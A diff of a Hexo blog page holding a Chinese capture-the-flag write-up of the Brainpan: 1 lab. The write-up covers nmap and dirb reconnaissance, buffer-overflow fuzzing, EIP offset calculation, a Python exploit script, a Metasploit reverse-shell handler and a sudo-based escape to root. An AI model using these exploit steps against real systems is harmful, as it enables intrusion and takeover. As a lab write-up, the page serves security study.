@@ -5,50 +5,50 @@
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
 <meta name="theme-color" content="#222">
 <meta name="generator" content="Hexo 6.0.0">
-  <link rel="apple-touch-icon" sizes="180x180" href="/wan1/images/apple-touch-icon-next.png">
-  <link rel="icon" type="image/png" sizes="32x32" href="/wan1/images/favicon-32x32-next.png">
-  <link rel="icon" type="image/png" sizes="16x16" href="/wan1/images/favicon-16x16-next.png">
-  <link rel="mask-icon" href="/wan1/images/logo.svg" color="#222">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
 
-<link rel="stylesheet" href="/wan1/css/main.css">
+<link rel="stylesheet" href="/css/main.css">
 
 
-<link rel="stylesheet" href="/wan1/lib/font-awesome/css/all.min.css">
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
 
 <script id="hexo-configurations">
     var NexT = window.NexT || {};
-    var CONFIG = {"hostname":"wanheiqiyihu.gitee.io","root":"/wan1/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+    var CONFIG = {"hostname":"wanheiqiyihu.top","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
   </script>
 
   <meta name="description" content="Brainpan: 1本次靶场涉及到缓冲区溢出，我就当学习这个东西了，缓冲区溢出看看攻略。 信息收集首先还是找到靶场的位置为第一步 nmap 192.168.100.0&#x2F;24 -n -sP -sn  拿到对面ip地址为192.168.100.171 进行端口扫描 nmap -A 192.168.100.171  开启了9999和10000端口 看到9999提示需要输入密码，我们访问10000并且扫">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Brainpan: 1">
-<meta property="og:url" content="https://wanheiqiyihu.gitee.io/wan1/2022/11/06/Brainpan-1/index.html">
+<meta property="og:url" content="https://wanheiqiyihu.top/2022/11/06/Brainpan-1/index.html">
 <meta property="og:site_name" content="十三の博客">
 <meta property="og:description" content="Brainpan: 1本次靶场涉及到缓冲区溢出，我就当学习这个东西了，缓冲区溢出看看攻略。 信息收集首先还是找到靶场的位置为第一步 nmap 192.168.100.0&#x2F;24 -n -sP -sn  拿到对面ip地址为192.168.100.171 进行端口扫描 nmap -A 192.168.100.171  开启了9999和10000端口 看到9999提示需要输入密码，我们访问10000并且扫">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://wanheiqiyihu.gitee.io/wan1/wan1/2022/11/06/Brainpan-1/image-20221106131316606.png">
-<meta property="og:image" content="https://wanheiqiyihu.gitee.io/wan1/wan1/2022/11/06/Brainpan-1/image-20221106131541462.png">
-<meta property="og:image" content="https://wanheiqiyihu.gitee.io/wan1/wan1/2022/11/06/Brainpan-1/image-20221106131844067.png">
-<meta property="og:image" content="https://wanheiqiyihu.gitee.io/wan1/wan1/2022/11/06/Brainpan-1/image-20221106133554037.png">
-<meta property="og:image" content="https://wanheiqiyihu.gitee.io/wan1/wan1/2022/11/06/Brainpan-1/image-20221106151706491.png">
-<meta property="og:image" content="https://wanheiqiyihu.gitee.io/wan1/wan1/2022/11/06/Brainpan-1/image-20221106152001387.png">
-<meta property="og:image" content="https://wanheiqiyihu.gitee.io/wan1/wan1/2022/11/06/Brainpan-1/image-20221106152057720.png">
-<meta property="og:image" content="https://wanheiqiyihu.gitee.io/wan1/wan1/2022/11/06/Brainpan-1/image-20221106153446651.png">
-<meta property="og:image" content="https://wanheiqiyihu.gitee.io/wan1/wan1/2022/11/06/Brainpan-1/image-20221106153510541.png">
-<meta property="og:image" content="https://wanheiqiyihu.gitee.io/wan1/wan1/2022/11/06/Brainpan-1/image-20221106153645803.png">
-<meta property="og:image" content="https://wanheiqiyihu.gitee.io/wan1/wan1/2022/11/06/Brainpan-1/image-20221106185820388.png">
-<meta property="og:image" content="https://wanheiqiyihu.gitee.io/wan1/wan1/2022/11/06/Brainpan-1/image-20221106190010146.png">
-<meta property="og:image" content="https://wanheiqiyihu.gitee.io/wan1/wan1/2022/11/06/Brainpan-1/image-20221106191721538.png">
-<meta property="og:image" content="https://wanheiqiyihu.gitee.io/wan1/wan1/2022/11/06/Brainpan-1/image-20221106191759405.png">
-<meta property="og:image" content="https://wanheiqiyihu.gitee.io/wan1/wan1/2022/11/06/Brainpan-1/image-20221106192529634.png">
+<meta property="og:image" content="https://wanheiqiyihu.top/2022/11/06/Brainpan-1/image-20221106131316606.png">
+<meta property="og:image" content="https://wanheiqiyihu.top/2022/11/06/Brainpan-1/image-20221106131541462.png">
+<meta property="og:image" content="https://wanheiqiyihu.top/2022/11/06/Brainpan-1/image-20221106131844067.png">
+<meta property="og:image" content="https://wanheiqiyihu.top/2022/11/06/Brainpan-1/image-20221106133554037.png">
+<meta property="og:image" content="https://wanheiqiyihu.top/2022/11/06/Brainpan-1/image-20221106151706491.png">
+<meta property="og:image" content="https://wanheiqiyihu.top/2022/11/06/Brainpan-1/image-20221106152001387.png">
+<meta property="og:image" content="https://wanheiqiyihu.top/2022/11/06/Brainpan-1/image-20221106152057720.png">
+<meta property="og:image" content="https://wanheiqiyihu.top/2022/11/06/Brainpan-1/image-20221106153446651.png">
+<meta property="og:image" content="https://wanheiqiyihu.top/2022/11/06/Brainpan-1/image-20221106153510541.png">
+<meta property="og:image" content="https://wanheiqiyihu.top/2022/11/06/Brainpan-1/image-20221106153645803.png">
+<meta property="og:image" content="https://wanheiqiyihu.top/2022/11/06/Brainpan-1/image-20221106185820388.png">
+<meta property="og:image" content="https://wanheiqiyihu.top/2022/11/06/Brainpan-1/image-20221106190010146.png">
+<meta property="og:image" content="https://wanheiqiyihu.top/2022/11/06/Brainpan-1/image-20221106191721538.png">
+<meta property="og:image" content="https://wanheiqiyihu.top/2022/11/06/Brainpan-1/image-20221106191759405.png">
+<meta property="og:image" content="https://wanheiqiyihu.top/2022/11/06/Brainpan-1/image-20221106192529634.png">
 <meta property="article:published_time" content="2022-11-06T11:33:38.000Z">
 <meta property="article:modified_time" content="2022-11-06T11:35:14.000Z">
 <meta property="article:author" content="十三">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://wanheiqiyihu.gitee.io/wan1/wan1/2022/11/06/Brainpan-1/image-20221106131316606.png">
+<meta name="twitter:image" content="https://wanheiqiyihu.top/2022/11/06/Brainpan-1/image-20221106131316606.png">
 
-<link rel="canonical" href="https://wanheiqiyihu.gitee.io/wan1/2022/11/06/Brainpan-1/">
+<link rel="canonical" href="https://wanheiqiyihu.top/2022/11/06/Brainpan-1/">
 
 
 <script id="page-configurations">
@@ -110,7 +110,7 @@
 
   <div class="site-meta">
 
-    <a href="/wan1/" class="brand" rel="start">
+    <a href="/" class="brand" rel="start">
       <span class="logo-line-before"><i></i></span>
       <h1 class="site-title">十三の博客</h1>
       <span class="logo-line-after"><i></i></span>
@@ -131,92 +131,92 @@
   <ul id="menu" class="main-menu menu">
         <li class="menu-item menu-item-home">
 
-    <a href="/wan1/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
 
   </li>
         <li class="menu-item menu-item-archives">
 
-    <a href="/wan1/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
 
   </li>
         <li class="menu-item menu-item-ctf做题笔记">
 
-    <a href="/wan1/categories/Experience" rel="section"><i class="download fa-fw"></i>CTF做题笔记</a>
+    <a href="/categories/Experience" rel="section"><i class="download fa-fw"></i>CTF做题笔记</a>
 
   </li>
         <li class="menu-item menu-item-python">
 
-    <a href="/wan1/categories/python" rel="section"><i class="download fa-fw"></i>python</a>
+    <a href="/categories/python" rel="section"><i class="download fa-fw"></i>python</a>
 
   </li>
         <li class="menu-item menu-item-java">
 
-    <a href="/wan1/categories/java" rel="section"><i class="download fa-fw"></i>java</a>
+    <a href="/categories/java" rel="section"><i class="download fa-fw"></i>java</a>
 
   </li>
         <li class="menu-item menu-item-读书笔记">
 
-    <a href="/wan1/categories/readbook" rel="section"><i class="download fa-fw"></i>读书笔记</a>
+    <a href="/categories/readbook" rel="section"><i class="download fa-fw"></i>读书笔记</a>
 
   </li>
         <li class="menu-item menu-item-渗透测试">
 
-    <a href="/wan1/categories/penetration" rel="section"><i class="download fa-fw"></i>渗透测试</a>
+    <a href="/categories/penetration" rel="section"><i class="download fa-fw"></i>渗透测试</a>
 
   </li>
         <li class="menu-item menu-item-基础">
 
-    <a href="/wan1/categories/basic" rel="section"><i class="download fa-fw"></i>基础</a>
+    <a href="/categories/basic" rel="section"><i class="download fa-fw"></i>基础</a>
 
   </li>
         <li class="menu-item menu-item-轮子">
 
-    <a href="/wan1/categories/lunzi" rel="section"><i class="download fa-fw"></i>轮子</a>
+    <a href="/categories/lunzi" rel="section"><i class="download fa-fw"></i>轮子</a>
 
   </li>
         <li class="menu-item menu-item-漏洞库">
 
-    <a href="/wan1/categories/fuxian" rel="section"><i class="download fa-fw"></i>漏洞库</a>
+    <a href="/categories/fuxian" rel="section"><i class="download fa-fw"></i>漏洞库</a>
 
   </li>
         <li class="menu-item menu-item-工具">
 
-    <a href="/wan1/categories/tools" rel="section"><i class="download fa-fw"></i>工具</a>
+    <a href="/categories/tools" rel="section"><i class="download fa-fw"></i>工具</a>
 
   </li>
         <li class="menu-item menu-item-代码审计">
 
-    <a href="/wan1/categories/daima" rel="section"><i class="download fa-fw"></i>代码审计</a>
+    <a href="/categories/daima" rel="section"><i class="download fa-fw"></i>代码审计</a>
 
   </li>
         <li class="menu-item menu-item-逆向">
 
-    <a href="/wan1/categories/nixiang" rel="section"><i class="download fa-fw"></i>逆向</a>
+    <a href="/categories/nixiang" rel="section"><i class="download fa-fw"></i>逆向</a>
 
   </li>
         <li class="menu-item menu-item-应急响应">
 
-    <a href="/wan1/categories/yingji" rel="section"><i class="download fa-fw"></i>应急响应</a>
+    <a href="/categories/yingji" rel="section"><i class="download fa-fw"></i>应急响应</a>
 
   </li>
         <li class="menu-item menu-item-免杀">
 
-    <a href="/wan1/categories/miansha" rel="section"><i class="download fa-fw"></i>免杀</a>
+    <a href="/categories/miansha" rel="section"><i class="download fa-fw"></i>免杀</a>
 
   </li>
         <li class="menu-item menu-item-靶场">
 
-    <a href="/wan1/categories/bachang" rel="section"><i class="download fa-fw"></i>靶场</a>
+    <a href="/categories/bachang" rel="section"><i class="download fa-fw"></i>靶场</a>
 
   </li>
         <li class="menu-item menu-item-cve申请">
 
-    <a href="/wan1/categories/cve" rel="section"><i class="download fa-fw"></i>cve申请</a>
+    <a href="/categories/cve" rel="section"><i class="download fa-fw"></i>cve申请</a>
 
   </li>
         <li class="menu-item menu-item-c语言">
 
-    <a href="/wan1/categories/c" rel="section"><i class="download fa-fw"></i>c语言</a>
+    <a href="/categories/c" rel="section"><i class="download fa-fw"></i>c语言</a>
 
   </li>
       <li class="menu-item menu-item-search">
@@ -274,10 +274,10 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-cn">
-    <link itemprop="mainEntityOfPage" href="https://wanheiqiyihu.gitee.io/wan1/2022/11/06/Brainpan-1/">
+    <link itemprop="mainEntityOfPage" href="https://wanheiqiyihu.top/2022/11/06/Brainpan-1/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/wan1/images/avatar.gif">
+      <meta itemprop="image" content="/images/avatar.gif">
       <meta itemprop="name" content="十三">
       <meta itemprop="description" content="潜心学习，不骄不躁">
     </span>
@@ -306,7 +306,7 @@
               </span>
               <span class="post-meta-item-text">分类于</span>
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/wan1/categories/bachang/" itemprop="url" rel="index"><span itemprop="name">-bachang</span></a>
+                  <a href="/categories/bachang/" itemprop="url" rel="index"><span itemprop="name">-bachang</span></a>
                 </span>
             </span>
 
@@ -324,19 +324,19 @@
         <h1 id="Brainpan-1"><a href="#Brainpan-1" class="headerlink" title="Brainpan: 1"></a>Brainpan: 1</h1><p>本次靶场涉及到缓冲区溢出，我就当学习这个东西了，缓冲区溢出看看攻略。</p>
 <h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p>首先还是找到靶场的位置为第一步</p>
 <p><code>nmap 192.168.100.0/24 -n -sP -sn</code></p>
-<p><img src="/wan1/wan1/2022/11/06/Brainpan-1/image-20221106131316606.png" alt="image-20221106131316606"></p>
+<p><img src="/2022/11/06/Brainpan-1/image-20221106131316606.png" alt="image-20221106131316606"></p>
 <p>拿到对面ip地址为<code>192.168.100.171</code></p>
 <p>进行端口扫描</p>
 <p><code>nmap -A 192.168.100.171</code></p>
-<p><img src="/wan1/wan1/2022/11/06/Brainpan-1/image-20221106131541462.png" alt="image-20221106131541462"></p>
+<p><img src="/2022/11/06/Brainpan-1/image-20221106131541462.png" alt="image-20221106131541462"></p>
 <p>开启了9999和10000端口</p>
 <p>看到9999提示需要输入密码，我们访问10000并且扫描一下目录。</p>
 <p><code>dirb http://192.168.100.171:10000</code></p>
 <p>扫到bin目录，并且发现exe文件</p>
-<p><img src="/wan1/wan1/2022/11/06/Brainpan-1/image-20221106131844067.png" alt="image-20221106131844067"></p>
+<p><img src="/2022/11/06/Brainpan-1/image-20221106131844067.png" alt="image-20221106131844067"></p>
 <h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>我个人的见解，在靶场中要是看到了exe文件那百分之八十都是缓冲区溢出漏洞。</p>
 <p>下载之后打开发现，这是一个开启9999端口等待连接的程序</p>
-<p><img src="/wan1/wan1/2022/11/06/Brainpan-1/image-20221106133554037.png" alt="image-20221106133554037"></p>
+<p><img src="/2022/11/06/Brainpan-1/image-20221106133554037.png" alt="image-20221106133554037"></p>
 <p>联想到刚才扫描到的9999端口，对面就是在9999同样开启了这么一个服务。</p>
 <h2 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h2><p>一个是poc一个是exp</p>
 <p>poc：检测溢出的地方是在多少字符串</p>
@@ -349,21 +349,21 @@
 <p>我这里由于本机环境问题，我就给安装到虚拟机上面了。</p>
 <h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><h3 id="fuzzing"><a href="#fuzzing" class="headerlink" title="fuzzing"></a>fuzzing</h3><p>首先在虚拟机上打开我们下载好的exe</p>
 <p>首先使用poc检测是否存在缓冲区溢出漏洞</p>
-<p><img src="/wan1/wan1/2022/11/06/Brainpan-1/image-20221106151706491.png" alt="image-20221106151706491"></p>
+<p><img src="/2022/11/06/Brainpan-1/image-20221106151706491.png" alt="image-20221106151706491"></p>
 <p>发现在发送到600字节的时候就崩溃了，说明存在缓冲区溢出漏洞。</p>
 <h3 id="计算EIP位置"><a href="#计算EIP位置" class="headerlink" title="计算EIP位置"></a>计算EIP位置</h3><p>此时我们生成一段不重复字节，我们在这里选择600个字节，执行：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 600</span><br></pre></td></tr></table></figure>
 
-<p><img src="/wan1/wan1/2022/11/06/Brainpan-1/image-20221106152001387.png" alt="image-20221106152001387"></p>
+<p><img src="/2022/11/06/Brainpan-1/image-20221106152001387.png" alt="image-20221106152001387"></p>
 <p>复制这串字符，放到我们的exp中</p>
-<p><img src="/wan1/wan1/2022/11/06/Brainpan-1/image-20221106152057720.png" alt="image-20221106152057720"></p>
+<p><img src="/2022/11/06/Brainpan-1/image-20221106152057720.png" alt="image-20221106152057720"></p>
 <p>现在把exe放在immunity debugger中运行，观察其中EIP的值为</p>
 <p>72413172</p>
-<p><img src="/wan1/wan1/2022/11/06/Brainpan-1/image-20221106153446651.png" alt="image-20221106153446651"></p>
+<p><img src="/2022/11/06/Brainpan-1/image-20221106153446651.png" alt="image-20221106153446651"></p>
 <p>计算一下偏移量</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 72413172</span><br></pre></td></tr></table></figure>
 
-<p><img src="/wan1/wan1/2022/11/06/Brainpan-1/image-20221106153510541.png" alt="image-20221106153510541"></p>
+<p><img src="/2022/11/06/Brainpan-1/image-20221106153510541.png" alt="image-20221106153510541"></p>
 <p>偏移量为514</p>
 <h3 id="查找坏字节"><a href="#查找坏字节" class="headerlink" title="查找坏字节"></a>查找坏字节</h3><p>我们在Immunity Debugger中输入：<code>!mona bytearray -b &quot;\x00&quot;</code></p>
 <p>0x00在C/C++语言中表示终止，所以是一个很普遍的坏字节，在上面我们首先把它排除掉。 我们用下面的bytearray.py脚本生成所有字节码：</p>
@@ -376,14 +376,14 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">#coding=utf-8</span><br><span class="line">#!/usr/bin/python</span><br><span class="line"></span><br><span class="line">#这里主要是为了定位EIP的内存地址</span><br><span class="line">import socket</span><br><span class="line"></span><br><span class="line">ip = &quot;127.0.0.1&quot;</span><br><span class="line">port = 9999</span><br><span class="line"></span><br><span class="line">prefix = &quot;OVERFLOW1 &quot;</span><br><span class="line">offset = 514</span><br><span class="line">overflow = &quot;A&quot; * offset</span><br><span class="line">retn = &quot;BBBB&quot;</span><br><span class="line">padding = &quot;&quot;</span><br><span class="line">payload = &quot;\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b \x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff&quot;</span><br><span class="line">postfix = &quot;&quot;</span><br><span class="line"></span><br><span class="line">buffer = prefix + overflow + retn + padding + payload + postfix</span><br><span class="line"></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line"></span><br><span class="line">try:</span><br><span class="line">  s.connect((ip, port))</span><br><span class="line">  print(&quot;Sending evil buffer...&quot;)</span><br><span class="line">  s.send(bytes(buffer + &quot;\r\n&quot;, &quot;latin-1&quot;))</span><br><span class="line">  print(&quot;Done!&quot;)</span><br><span class="line">except:</span><br><span class="line">  print(&quot;Could not connect.&quot;)</span><br></pre></td></tr></table></figure>
 
 <p>同时，我们把偏移量514赋值到offset变量，把”BBBB”赋值到retn变量，重启brainpan.exe，执行上面的脚本</p>
-<p><img src="/wan1/wan1/2022/11/06/Brainpan-1/image-20221106153645803.png" alt="image-20221106153645803"></p>
+<p><img src="/2022/11/06/Brainpan-1/image-20221106153645803.png" alt="image-20221106153645803"></p>
 <p>可以看到EIP的值，此时已经变成42424242了，42在ASCII里面就是大写的B，也就是我们的retn值已经 成功覆盖到EIP中。</p>
 <p>同时也记住这里的ESP值为005FF921（又走了一位）</p>
 <p>我们执行</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!mona compare -f C:\mona\brainpan\bytearray.bin -a 0028F930</span><br></pre></td></tr></table></figure>
 
 <p>除了执行上面那个命令，我们也可以通过查看</p>
-<p><img src="/wan1/wan1/2022/11/06/Brainpan-1/image-20221106185820388.png" alt="image-20221106185820388"></p>
+<p><img src="/2022/11/06/Brainpan-1/image-20221106185820388.png" alt="image-20221106185820388"></p>
 <p>跟进去查看有没有无法显示的字节</p>
 <p>但是博主说这里面没有怀字节，因为我没找到这个bin文件，不过，0x00在C/C++语言中表示终止，所以是一个很普遍的坏字节，因此在这种情况下，我们可以认为唯一的坏字节是：<code>\x00</code></p>
 <h3 id="找到可以利用的ESP地址"><a href="#找到可以利用的ESP地址" class="headerlink" title="找到可以利用的ESP地址"></a>找到可以利用的ESP地址</h3><p><code>!mona jmp -r esp -cpb &quot;\x00&quot;</code>和<code>ctrl+f jmp esp</code>都可以找到这个地址</p>
@@ -398,18 +398,18 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">use exploit/multi/handler</span><br><span class="line">set payload linux/x86/shell_reverse_tcp</span><br><span class="line">set lport 443</span><br><span class="line">set lhost 192.168.2.157</span><br><span class="line">exploit -j</span><br></pre></td></tr></table></figure>
 
 <p>就可以看到弹回一个会话了</p>
-<p><img src="/wan1/wan1/2022/11/06/Brainpan-1/image-20221106190010146.png" alt="image-20221106190010146"></p>
-<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p><img src="/wan1/wan1/2022/11/06/Brainpan-1/image-20221106191721538.png" alt="image-20221106191721538"></p>
+<p><img src="/2022/11/06/Brainpan-1/image-20221106190010146.png" alt="image-20221106190010146"></p>
+<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p><img src="/2022/11/06/Brainpan-1/image-20221106191721538.png" alt="image-20221106191721538"></p>
 <p>没有密码的root权限，那我们就</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo /home/anansi/bin/anansi_util</span><br></pre></td></tr></table></figure>
 
-<p><img src="/wan1/wan1/2022/11/06/Brainpan-1/image-20221106191759405.png" alt="image-20221106191759405"></p>
+<p><img src="/2022/11/06/Brainpan-1/image-20221106191759405.png" alt="image-20221106191759405"></p>
 <p>第三个参数可以执行命令</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">扩展</span><br><span class="line">shell中#一般表示注释的意思，所以很多时候认为#!也是注释，但实际上不是，和c语言中头文件一样是声明文件的路径。</span><br><span class="line"></span><br><span class="line">#! /bin/sh 是指此脚本使用/bin/sh 来执行</span><br><span class="line"></span><br><span class="line">#!是特殊的表示符，其后面跟的是解释此脚本的shell的路径，如果没有声明，则脚本将在默认的shell中执行，默认shell是由用户所在的系统定义为执行shell脚本。</span><br></pre></td></tr></table></figure>
 
 <p>所以我们可以在执行此脚本的时候，中间插一个<code>!/bin/sh</code></p>
 <p>这时候就会返回一个root权限的会话了</p>
-<p><img src="/wan1/wan1/2022/11/06/Brainpan-1/image-20221106192529634.png" alt="image-20221106192529634"></p>
+<p><img src="/2022/11/06/Brainpan-1/image-20221106192529634.png" alt="image-20221106192529634"></p>
 <h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>提权技巧需要专门开一篇来进行总结，缓冲区溢出第一次接触，耗费时间有点久，不过好在是理解了其中的原理。感觉也挺简单，下次碰到可以自己做了。</p>
 
     </div>
@@ -426,11 +426,11 @@
         
     <div class="post-nav">
       <div class="post-nav-item">
-    <a href="/wan1/2022/11/06/%E5%89%8D%E7%AB%AF%E5%8A%A0%E5%AF%86%E7%88%86%E7%A0%B4/" rel="prev" title="前端加密爆破">
+    <a href="/2022/11/06/%E5%89%8D%E7%AB%AF%E5%8A%A0%E5%AF%86%E7%88%86%E7%A0%B4/" rel="prev" title="前端加密爆破">
       <i class="fa fa-chevron-left"></i> 前端加密爆破
     </a></div>
       <div class="post-nav-item">
-    <a href="/wan1/2022/11/08/%E8%8A%B1%E7%94%9F%E5%A3%B3%E8%A7%A3%E5%86%B3%E6%B2%A1%E6%9C%89%E5%85%AC%E7%BD%91ip%E5%8F%8D%E5%BC%B9shell/" rel="next" title="花生壳解决没有公网ip反弹shell">
+    <a href="/2022/11/08/%E8%8A%B1%E7%94%9F%E5%A3%B3%E8%A7%A3%E5%86%B3%E6%B2%A1%E6%9C%89%E5%85%AC%E7%BD%91ip%E5%8F%8D%E5%BC%B9shell/" rel="next" title="花生壳解决没有公网ip反弹shell">
       花生壳解决没有公网ip反弹shell <i class="fa fa-chevron-right"></i>
     </a></div>
     </div>
@@ -498,14 +498,14 @@
       <div class="site-overview-wrap sidebar-panel">
         <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
     <img class="site-author-image" itemprop="image" alt="十三"
-      src="/wan1/images/avatar.gif">
+      src="/images/avatar.gif">
   <p class="site-author-name" itemprop="name">十三</p>
   <div class="site-description" itemprop="description">潜心学习，不骄不躁</div>
 </div>
 <div class="site-state-wrap motion-element">
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
-          <a href="/wan1/archives/">
+          <a href="/archives/">
         
           <span class="site-state-item-count">172</span>
           <span class="site-state-item-name">日志</span>
@@ -566,48 +566,48 @@
   </div>
 
   
-  <script src="/wan1/lib/anime.min.js"></script>
-  <script src="/wan1/lib/velocity/velocity.min.js"></script>
-  <script src="/wan1/lib/velocity/velocity.ui.min.js"></script>
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
 
-<script src="/wan1/js/utils.js"></script>
+<script src="/js/utils.js"></script>
 
-<script src="/wan1/js/motion.js"></script>
-
-
-<script src="/wan1/js/schemes/pisces.js"></script>
+<script src="/js/motion.js"></script>
 
 
-<script src="/wan1/js/next-boot.js"></script>
+<script src="/js/schemes/pisces.js"></script>
 
 
-
-
-  
-
-
-
-
-  
-<script src="/wan1/js/local-search.js"></script>
-
-
-
-
-
-
-
-
-
+<script src="/js/next-boot.js"></script>
 
 
 
 
   
 
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
   
 
